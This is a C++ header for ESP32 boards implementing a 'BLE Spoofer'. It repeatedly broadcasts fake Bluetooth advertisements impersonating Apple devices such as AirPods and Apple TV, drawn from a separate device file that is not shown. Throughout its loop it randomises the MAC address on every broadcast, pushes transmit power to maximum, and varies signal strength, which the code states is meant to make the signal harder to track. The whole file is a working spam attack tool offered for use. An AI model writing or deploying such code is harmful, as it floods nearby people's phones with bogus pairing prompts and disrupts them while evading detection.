#ifndef BLE_SPOOFER_H
#define BLE_SPOOFER_H

#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <esp_arduino_version.h>

// Bluetooth maximum transmit power
#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21  // ESP32C3 ESP32C2 ESP32S3
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
#define MAX_TX_POWER ESP_PWR_LVL_P20  // ESP32H2 ESP32C6
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9   // Default
#endif

// Separate header file for device data
#include "devices.hpp"

class BLESpoofer {
private:
    BLEAdvertising *pAdvertising;  // global variable
    uint32_t delayMilliseconds = 1000;
    bool isActive;
    
    // Pin definitions for AirM2M ESP32 board
    const int ledPin1 = 15;

public:
    BLESpoofer() : isActive(false) {}

    void setup() {
        // This is specific to the AirM2M ESP32 board
        pinMode(ledPin1, OUTPUT);
       

        BLEDevice::init("AirPods 69");

        // Increase the BLE Power to maximum
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

        // Create the BLE Server
        BLEServer *pServer = BLEDevice::createServer();
        pAdvertising = pServer->getAdvertising();

        // Initialize with a default address
        esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
        pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
        
        Serial.println("BLE Spoofer module initialized");
        isActive = false;
    }

    void start() {
        isActive = true;
        Serial.println("BLE Spoofing activated");
    }

    void stop() {
        isActive = false;
        digitalWrite(ledPin1, LOW);
        if (pAdvertising) {
            pAdvertising->stop();
        }
        Serial.println("BLE Spoofing deactivated");
    }

    void setDelay(uint32_t delay) {
        delayMilliseconds = delay;
        Serial.println("BLE advertisement delay set to: " + String(delayMilliseconds) + "ms");
    }

    void loop() {
        if (!isActive) return;

        // Turn lights on during "busy" part
        digitalWrite(ledPin1, HIGH);

        // First generate fake random MAC
        esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
        for (int i = 0; i < 6; i++){
            dummy_addr[i] = random(256);

            // It seems for some reason first 4 bits
            // Need to be high (aka 0b1111), so we 
            // OR with 0xF0
            if (i == 0){
                dummy_addr[i] |= 0xF0;
            }
        }

        BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

        // Randomly pick data from one of the devices
        // First decide short or long
        // 0 = long (headphones), 1 = short (misc stuff like Apple TV)
        int device_choice = random(2);
        if (device_choice == 0){
            int index = random(17);
            #ifdef ESP_ARDUINO_VERSION_MAJOR
                #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
                    oAdvertisementData.addData(String((char*)DEVICES[index], 31));
                #else
                    oAdvertisementData.addData(std::string((char*)DEVICES[index], 31));
                #endif
            #endif
        } else {
            int index = random(13);
            #ifdef ESP_ARDUINO_VERSION_MAJOR
                #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
                    oAdvertisementData.addData(String((char*)SHORT_DEVICES[index], 23));
                #else
                    oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[index], 23));
                #endif
            #endif
        }

        // Random advertisement type
        int adv_type_choice = random(3);
        if (adv_type_choice == 0){
            pAdvertising->setAdvertisementType(ADV_TYPE_IND);
        } else if (adv_type_choice == 1){
            pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
        } else {
            pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
        }

        // Set the device address, advertisement data
        pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
        pAdvertising->setAdvertisementData(oAdvertisementData);
        
        // Start advertising
        Serial.println("Sending BLE Advertisement...");
        pAdvertising->start();

        // Turn lights off while "sleeping"
        digitalWrite(ledPin1, LOW);
        delay(delayMilliseconds);
        pAdvertising->stop();

        // Random signal strength increases the difficulty of tracking the signal
        int rand_val = random(100);  // Generate a random number between 0 and 99
        if (rand_val < 70) {  // 70% probability
            esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
        } else if (rand_val < 85) {  // 15% probability
            esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 1));
        } else if (rand_val < 95) {  // 10% probability
            esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 2));
        } else if (rand_val < 99) {  // 4% probability
            esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 3));
        } else {  // 1% probability
            esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 4));
        }
    }
};

#endif // BLE_SPOOFER_H